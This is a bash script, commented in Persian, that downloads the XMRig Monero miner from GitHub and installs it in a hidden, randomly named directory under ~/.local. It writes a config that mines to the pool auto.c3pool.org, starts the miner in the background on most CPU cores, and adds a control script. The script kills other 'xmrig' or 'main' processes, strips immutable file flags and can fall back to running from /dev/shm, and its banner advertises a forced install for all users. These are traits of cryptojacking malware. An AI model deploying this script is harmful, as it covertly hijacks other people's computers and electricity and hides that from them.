#!/bin/bash
VERSION=2.29
echo "XMRig Miner v$VERSION - FORCED IN /home/user/.local/ - ALL USERS"
echo
export LC_ALL=C
export LANG=C

# --- یوزر و مسیر ---
REAL_USER="$(whoami)"
REAL_HOME="/home/$REAL_USER"
LOCAL_DIR="$REAL_HOME/.local"
WALLET="$1"

if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet_address>"
    exit 1
fi

# --- پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
    echo "ERROR: Install curl & tar"
    exit 1
fi

# --- هسته‌ها ---
CPU_TOTAL=$(nproc 2>/dev/null || echo 1)
USABLE_THREADS=$((CPU_TOTAL > 1 ? CPU_TOTAL - 1 : 1))
CPU_HINT=85
echo "[*] Using $USABLE_THREADS threads @ $CPU_HINT%"

# --- ساخت .local اگر نبود ---
if [ ! -d "$LOCAL_DIR" ]; then
    mkdir -p "$LOCAL_DIR" || { echo "ERROR: Cannot create $LOCAL_DIR"; exit 1; }
fi
chmod 700 "$LOCAL_DIR" 2>/dev/null

# --- مسیر مخفی ---
RAND_HEX=$(openssl rand -hex 16 2>/dev/null || date +%s%N | md5sum | head -c 32)
BASE_DIR="$LOCAL_DIR/.miner_$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

# --- پاک‌سازی اولیه ---
pkill -f "xmrig" 2>/dev/null
pkill -f "main" 2>/dev/null
find "$LOCAL_DIR" -name ".miner_*" -type d -exec rm -rf {} + 2>/dev/null

# --- ساخت پوشه با چک کامل ---
if ! mkdir -p "$BASE_DIR" "$LOG_DIR" 2>/dev/null; then
    echo "ERROR: Cannot create $BASE_DIR"
    exit 1
fi

# --- رفع قفل‌های احتمالی ---
chmod 700 "$BASE_DIR" "$LOG_DIR" 2>/dev/null
chattr -i "$BASE_DIR" "$LOG_DIR" 2>/dev/null || true

# --- تست نوشتن فایل ---
if ! echo "test" > "$BASE_DIR/.test_write" 2>/dev/null || ! rm "$BASE_DIR/.test_write" 2>/dev/null; then
    echo "ERROR: $BASE_DIR not writable for files"
    exit 1
fi

echo "[*] Installing in: $BASE_DIR"

# --- دانلود و استخراج ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP_TAR="/tmp/xmrig_$$.tgz"
TMP_DIR="/tmp/xmrig_extract_$$"

# پاکسازی تمپ قبلی
rm -rf "/tmp/xmrig_*" "/tmp/xmrig-*" 2>/dev/null

echo "[*] Downloading XMRig..."
if ! curl -fsSL "$URL" -o "$TMP_TAR"; then
    echo "ERROR: Download failed"
    rm -f "$TMP_TAR"
    exit 1
fi

# ایجاد دایرکتوری موقت برای استخراج
mkdir -p "$TMP_DIR"
if ! tar xzf "$TMP_TAR" -C "$TMP_DIR" --strip-components=1 2>/dev/null; then
    echo "ERROR: Extract failed"
    rm -f "$TMP_TAR"
    rm -rf "$TMP_DIR"
    exit 1
fi

# پیدا کردن فایل باینری
XMRIG_BIN=$(find "$TMP_DIR" -name "xmrig" -type f -executable 2>/dev/null | head -1)
if [ -z "$XMRIG_BIN" ] || [ ! -f "$XMRIG_BIN" ]; then
    echo "ERROR: xmrig binary not found in archive"
    rm -f "$TMP_TAR"
    rm -rf "$TMP_DIR"
    exit 1
fi

echo "[*] Found binary: $XMRIG_BIN"

# --- کپی باینری با روش‌های مختلف ---
install_binary() {
    echo "[*] Copying binary to $BASE_DIR/main..."
    
    # روش 1: cp ساده
    if cp "$XMRIG_BIN" "$BASE_DIR/main" 2>/dev/null; then
        chmod +x "$BASE_DIR/main"
        echo "[*] Binary copied successfully with cp"
        return 0
    fi
    
    # روش 2: cat برای کپی
    if cat "$XMRIG_BIN" > "$BASE_DIR/main" 2>/dev/null; then
        chmod +x "$BASE_DIR/main"
        echo "[*] Binary copied successfully with cat"
        return 0
    fi
    
    # روش 3: استفاده از /dev/shm
    SHM_DIR="/dev/shm/.miner_$$"
    if mkdir -p "$SHM_DIR" 2>/dev/null && cp "$XMRIG_BIN" "$SHM_DIR/main" 2>/dev/null; then
        chmod +x "$SHM_DIR/main"
        # ایجاد سیملینک
        if ln -sf "$SHM_DIR/main" "$BASE_DIR/main" 2>/dev/null; then
            echo "[*] Binary linked from RAM: $SHM_DIR/main"
            return 0
        fi
    fi
    
    return 1
}

if ! install_binary; then
    echo "ERROR: Failed to install binary"
    rm -f "$TMP_TAR"
    rm -rf "$TMP_DIR"
    exit 1
fi

# پاکسازی فایل‌های موقت
rm -f "$TMP_TAR"
rm -rf "$TMP_DIR"

# بررسی نهایی وجود فایل باینری
if [ ! -f "$BASE_DIR/main" ] && [ ! -L "$BASE_DIR/main" ]; then
    echo "ERROR: Binary not found after installation"
    exit 1
fi

if [ -L "$BASE_DIR/main" ]; then
    echo "[*] Using symbolic link to binary"
elif [ -f "$BASE_DIR/main" ]; then
    echo "[*] Using direct binary copy"
fi

# --- config.json ---
echo "[*] Creating config.json..."
cat > "$BASE_DIR/config.json" << EOF
{
    "api": {
        "id": null,
        "worker-id": "$REAL_USER"
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": false,
    "randomx": {
        "init": $USABLE_THREADS,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": true,
        "priority": 2,
        "memory-pool": false,
        "max-threads-hint": 85,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false
    },
    "cuda": {
        "enabled": false
    },
    "pools": [
        {
            "algo": "rx/0",
            "url": "auto.c3pool.org:19999",
            "user": "$WALLET",
            "pass": "x",
            "rig-id": "$REAL_USER",
            "nicehash": false,
            "keepalive": true,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5
}
EOF

if [ ! -f "$BASE_DIR/config.json" ]; then
    echo "ERROR: Failed to create config.json"
    exit 1
fi

# --- control script ---
echo "[*] Creating control script..."
cat > "$BASE_DIR/control" << 'EOF'
#!/bin/bash
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$SCRIPT_DIR" || exit 1

MAIN="./main"
[ ! -x "$MAIN" ] && MAIN="$(readlink -f "$MAIN" 2>/dev/null)"

get_pid() {
    pgrep -f "main.*config.json" | grep -v $$ | head -1
}

case "$1" in
    start)
        if [ -n "$(get_pid)" ]; then
            echo "Already running"
            exit 0
        fi
        
        if [ ! -x "$MAIN" ]; then
            echo "ERROR: Miner binary not found or not executable"
            exit 1
        fi
        
        if [ ! -f "config.json" ]; then
            echo "ERROR: config.json not found"
            exit 1
        fi
        
        nohup "$MAIN" --config=config.json > .log/output.log 2>&1 &
        echo $! > .log/pid
        sleep 3
        
        if [ -n "$(get_pid)" ]; then
            echo "Started successfully"
        else
            echo "Failed to start - check .log/output.log"
            exit 1
        fi
        ;;
    stop)
        PID=$(get_pid)
        if [ -n "$PID" ]; then
            kill $PID 2>/dev/null
            sleep 2
            kill -9 $PID 2>/dev/null
            echo "Stopped"
        else
            echo "Not running"
        fi
        rm -f .log/pid
        ;;
    status)
        if [ -n "$(get_pid)" ]; then
            echo "Running"
        else
            echo "Stopped"
        fi
        ;;
    restart)
        "$0" stop
        sleep 2
        "$0" start
        ;;
    logs)
        if [ -f ".log/output.log" ]; then
            tail -20 ".log/output.log"
        else
            echo "No log file found"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|status|restart|logs}"
        exit 1
        ;;
esac
EOF

chmod +x "$BASE_DIR/control"

if [ ! -f "$BASE_DIR/control" ]; then
    echo "ERROR: Failed to create control script"
    exit 1
fi

# --- شروع ماینر ---
echo "[*] Starting miner..."
if ! "$BASE_DIR/control" start; then
    echo "ERROR: Failed to start miner"
    echo "Check logs: $BASE_DIR/.log/output.log"
    exit 1
fi

# --- بررسی نهایی ---
sleep 5
if "$BASE_DIR/control" status | grep -q "Running"; then
    echo
    echo "=== SUCCESS ==="
    echo "Miner running in: $BASE_DIR"
    echo "Control: $BASE_DIR/control status"
    echo "Logs: $BASE_DIR/control logs"
    echo "All $USABLE_THREADS cores @ 85%"
else
    echo
    echo "=== WARNING ==="
    echo "Miner may not be running properly"
    echo "Check: $BASE_DIR/control status"
    echo "Logs: $BASE_DIR/.log/output.log"
fi

exit 0
